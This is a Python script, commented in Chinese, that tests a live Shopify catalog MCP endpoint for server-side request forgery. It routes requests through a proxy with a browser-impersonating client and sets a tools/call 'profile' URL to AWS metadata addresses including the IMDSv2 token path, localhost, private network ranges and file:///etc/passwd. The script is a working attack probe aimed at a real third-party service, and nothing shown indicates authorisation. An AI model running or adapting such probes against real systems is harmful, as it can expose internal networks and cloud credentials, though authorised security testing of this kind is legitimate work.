# -*- coding: utf-8 -*-
"""SSRF 测试 v2:tools/call 的 arguments.meta.ucp-agent.profile 是否可指向任意 URL
验证服务端是否 fetch 该 URL(用 httpbin 回显确认),并探测内网/metadata
"""
import time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
url = "https://catalog.shopify.com/api/ucp/mcp"

def probe(label, profile, tool="search_catalog", args=None):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {
            "name": tool,
            "arguments": {"meta": {"ucp-agent": {"profile": profile}}, **(args or {"query": "shoes"})},
        },
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
        dt = time.time() - t0
        print(f"[{label}] HTTP {r.status_code} {dt:.1f}s | {r.text[:350]}")
    except Exception as e:
        dt = time.time() - t0
        print(f"[{label}] ERROR {dt:.1f}s {type(e).__name__} {e}")

if __name__ == "__main__":
    # 基线:合法 profile
    probe("基线-合法profile", "https://shopify.dev/ucp/agent-profiles/2026-04-08/personal_agent.json")
    time.sleep(0.5)
    # 外网回显:确认是否被 fetch 及返回内容
    probe("外网-httpbin", "http://httpbin.org/anything")
    time.sleep(0.5)
    probe("外网-httpbin2", "https://httpbin.org/anything")
    time.sleep(0.5)
    # 云 metadata
    probe("AWS-metadata", "http://169.254.169.254/latest/meta-data/")
    time.sleep(0.5)
    probe("AWS-imdsv2", "http://169.254.169.254/latest/api/token")
    time.sleep(0.5)
    # 本机/内网
    probe("本机-127", "http://127.0.0.1/")
    time.sleep(0.5)
    probe("本机-8080", "http://127.0.0.1:8080/")
    time.sleep(0.5)
    probe("localhost", "http://localhost/")
    time.sleep(0.5)
    probe("内网-10", "http://10.0.0.1/")
    time.sleep(0.5)
    probe("内网-172", "http://172.16.0.1/")
    time.sleep(0.5)
    probe("内网-192", "http://192.168.0.1/")
    time.sleep(0.5)
    # 其他协议
    probe("file", "file:///etc/passwd")
    time.sleep(0.5)
    # 不存在的工具名(看 profile 是否仍被 fetch)
    probe("不存在工具+httpbin", "http://httpbin.org/anything", tool="no_such_tool_xyz")
